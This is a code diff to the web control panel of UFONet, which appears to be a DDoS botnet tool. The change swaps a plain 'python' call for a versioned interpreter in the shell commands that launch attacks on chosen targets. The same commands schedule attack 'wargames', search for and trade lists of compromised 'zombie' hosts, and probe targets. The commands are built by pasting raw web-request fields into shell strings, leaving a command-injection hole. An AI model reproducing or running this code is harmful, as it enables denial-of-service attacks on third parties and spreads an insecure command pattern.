@@ -9,6 +9,11 @@ You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
+#######WORKAROUND PYTHON(3) VERSIONS####################
+import platform                                       
+python_version = "python"+platform.python_version_tuple()[0]+"."+platform.python_version_tuple()[1] 
+#######################################################
+
 import socket, threading, re, os, time, random, base64
 import webbrowser, subprocess, json, sys
 import urllib.request, urllib.error, urllib.parse
@@ -27,6 +32,7 @@ from core.tools.abductor import Abductor
 default_blackhole = '176.28.23.46' # default blackhole            #
 crypto_key = "U-NATi0n!" # default enc/dec (+moderator board) key #
 ###################################################################
+
 blackhole_sep = "|" # blackhole stream separator
 board_msg_sep = "#!#" # board stream separator
 grid_msg_sep = "#?#" # grid stream seperator
@@ -1462,8 +1468,8 @@ Last update: <font color='"""+ self.blackholes_status_color + """'>"""+ self.bla
                     job_estimated_dec = strftime("%d-%m-%Y %H:%M:%S", job_estimated_dec)
                     print("[Info] [Wargames] Time is over: [" + str(job_estimated_dec) + "] -> Engaging target: " + str(job_target_dec))
                     cmd = ""
-                    nonroot_cmd = "python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" "
-                    root_cmd = "sudo python -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" "
+                    nonroot_cmd = python_version + " -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" "
+                    root_cmd = "sudo "+ python_version+" -i ufonet -a "+str(job_target_dec)+" -r "+str(self.supply_botnet)+" "
                     if int(self.supply_monlist) > 0: 
                         cmd += "--monlist " +str(self.supply_monlist)+ " "
                         flag_monlist = True
@@ -2814,7 +2820,7 @@ function runCommandX(cmd,params) {
                 self.pages[page] = AjaxMap().ajax(pGet)
         if page == "/cmd_check_tool":
             self.pages["/cmd_check_tool"] = "<pre>Waiting for updates results...</pre>"
-            runcmd = "(python -i ufonet --update |tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --update |tee /tmp/out) &"
         if page == "/cmd_check_tool_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2840,16 +2846,16 @@ function runCommandX(cmd,params) {
                 self.pages["/cmd_view_attack"] = self.html_army_map(pGet['target'])
         if page == "/cmd_test_army":
             self.pages["/cmd_test_army"] = "<pre>Waiting for testing results...</pre>"
-            runcmd = "(python -i ufonet -t " + self.zombies_file + " " + cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet -t " + self.zombies_file + " " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_test_all":
             self.pages["/cmd_test_all"] = "<pre>Waiting for testing results...</pre>"
-            runcmd = "(python -i ufonet --test-all " + cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --test-all " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_test_offline":
             self.pages["/cmd_test_offline"] = "<pre>Waiting for testing results...</pre>"
-            runcmd = "(python -i ufonet --test-offline " + cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --test-offline " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_attack_me":
             self.pages["/cmd_attack_me"] = "<pre>Waiting for 'attack-me' results...</pre>"
-            runcmd = "(python -i ufonet --attack-me " + cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --attack-me " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_attack_me_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2857,7 +2863,7 @@ function runCommandX(cmd,params) {
                 self.pages["/cmd_attack_me_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_download_community":
             self.pages["/cmd_download_community"] = "<pre>Waiting for downloading results...</pre>"
-            runcmd = "(python -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --download-zombies "+ cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_download_community_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2865,7 +2871,7 @@ function runCommandX(cmd,params) {
                 self.pages["/cmd_download_community_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_upload_community":
             self.pages["/cmd_upload_community"] = "<pre>Waiting for uploading results...</pre>"
-            runcmd = "(python -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --upload-zombies "+ cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_upload_community_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2888,7 +2894,7 @@ function runCommandX(cmd,params) {
                 self.pages["/cmd_test_offline_update"] = "<pre>"+f.read()+"<pre>"
         if page == "/cmd_test_rpcs":
             self.pages["/cmd_test_rpcs"] = "<pre>Waiting for XML-RPC testing results...</pre>"
-            runcmd = "(python -i ufonet --test-rpc " + cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet --test-rpc " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_test_rpcs_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2904,8 +2910,8 @@ function runCommandX(cmd,params) {
             flag_nuke = None
             flag_tachyon = None
             flag_monlist = None
-            nonroot_cmd = "(python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
-            root_cmd = "(sudo python -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
+            nonroot_cmd = "("+python_version+" -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
+            root_cmd = "(sudo "+python_version+" -i ufonet -a '"+pGet["target"]+"' -b '"+pGet["path"]+"' -r '"+pGet["rounds"]+"' "
             end_cmd = ""+cmd_options + "|tee /tmp/out) &"
             if pGet["dbstress"]:
                 cmd += "--db '" +str(pGet["dbstress"])+ "' "
@@ -2948,7 +2954,7 @@ function runCommandX(cmd,params) {
             self.pages["/cmd_inspect"] = "<pre>Waiting for inspecting results...</pre>"
             target = pGet["target"]
             target=urllib.parse.unquote(target) 
-            runcmd = "(python -i ufonet -i '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet -i '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_inspect_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2958,7 +2964,7 @@ function runCommandX(cmd,params) {
             self.pages["/cmd_abduction"] = "<pre>Waiting for abduction results...</pre>"
             target = pGet["target"]
             target=urllib.parse.unquote(target)
-            runcmd = "(python -i ufonet -x '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
+            runcmd = "("+python_version+" -i ufonet -x '"+target+"' "+ cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_abduction_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
@@ -2969,25 +2975,25 @@ function runCommandX(cmd,params) {
             if pGet["dork_list"] == "on": # search using dork list (file: dorks.txt)
                 if pGet["all_engines"] == "on": # search using all search engines (and exclude those set by the user)
                     if pGet["exclude_engines"]:
-                        runcmd = "(python -i ufonet --sd 'botnet/dorks.txt' --sa '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
+                        runcmd = "("+python_version+" -i ufonet --sd 'botnet/dorks.txt' --sa '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
                     else:
-                        runcmd = "(python -i ufonet --sd 'botnet/dorks.txt' --sa " + cmd_options + "|tee /tmp/out) &"
+                        runcmd = "("+python_version+" -i ufonet --sd 'botnet/dorks.txt' --sa " + cmd_options + "|tee /tmp/out) &"
                 else: # search using a search engine
-                    runcmd = "(python -i ufonet --sd 'botnet/dorks.txt' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
+                    runcmd = "("+python_version+" -i ufonet --sd 'botnet/dorks.txt' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
             else: # search using a pattern
                 if pGet["autosearch"] == "on": # search using auto-search mod
                     if pGet["exclude_engines"]:
-                        runcmd = "(python -i ufonet --auto-search '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
+                        runcmd = "("+python_version+" -i ufonet --auto-search '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
                     else:
-                        runcmd = "(python -i ufonet --auto-search " + cmd_options + "|tee /tmp/out) &"
+                        runcmd = "("+python_version+" -i ufonet --auto-search " + cmd_options + "|tee /tmp/out) &"
                 else:
                     if pGet["all_engines"] == "on": # search using all search engines
                         if pGet["exclude_engines"]:
-                            runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sa '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
+                            runcmd = "("+python_version+" -i ufonet -s '"+pGet["dork"]+"' --sa '"+pGet["exclude_engines"]+"' " + cmd_options + "|tee /tmp/out) &"
                         else:
-                            runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
+                            runcmd = "("+python_version+" -i ufonet -s '"+pGet["dork"]+"' --sa " + cmd_options + "|tee /tmp/out) &"
                     else: # search using a search engine
-                        runcmd = "(python -i ufonet -s '"+pGet["dork"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
+                        runcmd = "("+python_version+" -i ufonet -s '"+pGet["dork"]+"' --se '"+pGet["s_engine"]+"' " + cmd_options + "|tee /tmp/out) &"
         if page == "/cmd_search_update":
             if not os.path.exists('/tmp/out'):
                 open('/tmp/out', 'w').close()
